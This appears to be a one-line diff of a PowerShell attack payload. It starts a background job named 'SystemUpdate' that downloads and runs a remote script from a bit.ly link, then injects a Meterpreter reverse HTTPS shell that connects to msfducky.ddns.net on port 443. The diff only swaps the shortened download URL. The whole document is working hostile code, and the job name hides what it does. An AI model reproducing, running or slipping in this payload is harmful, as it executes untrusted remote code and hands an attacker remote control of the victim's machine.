@@ -1,1 +1,1 @@
-Start-Job -Name SystemUpdate -Scriptblock {IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2i1yg"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost msfducky.ddns.net -Lport 443 -Force}
+Start-Job -Name SystemUpdate -Scriptblock {IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2hGPzSC"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost msfducky.ddns.net -Lport 443 -Force}
